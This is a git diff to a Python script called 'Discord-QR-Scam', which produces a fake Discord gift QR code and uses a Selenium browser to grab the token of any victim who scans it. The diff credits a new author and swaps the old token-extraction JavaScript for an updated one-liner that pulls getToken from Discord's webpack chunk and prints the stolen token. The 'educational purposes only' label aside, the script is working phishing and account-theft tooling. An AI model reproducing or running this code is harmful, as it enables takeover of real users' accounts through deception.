@@ -5,7 +5,7 @@ import base64
 import time
 import os
 
-# Developer: NightfallGT
+# Developer: NightfallGT (recoded by medovi40k)
 # Educational purposes only
 
 def logo_qr():
@@ -22,7 +22,7 @@ def paste_template():
     im1.save('discord_gift.png', quality=95)
 
 def main():
-    print('github.com/NightfallGT/Discord-QR-Scam\n')
+    print('github.com/medovi40k/Discord-QR-Scam\n')
     print('** QR Code Scam Generator **')
 
     options = webdriver.ChromeOptions()
@@ -57,24 +57,7 @@ def main():
     while True:
         if discord_login != driver.current_url:
             print('Grabbing token..')
-            token = driver.execute_script('''
-
-    var req = webpackJsonp.push([
-        [], {
-            extra_id: (e, t, r) => e.exports = r
-        },
-        [
-            ["extra_id"]
-        ]
-    ]);
-    for (let e in req.c)
-        if (req.c.hasOwnProperty(e)) {
-            let t = req.c[e].exports;
-            if (t && t.__esModule && t.default)
-                for (let e in t.default) "getToken" === e && (token = t.default.getToken())
-        }
-    return token;   
-                ''')
+            token = driver.execute_script("return (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken();");
             print('---')
             print('Token grabbed:',token)
             break
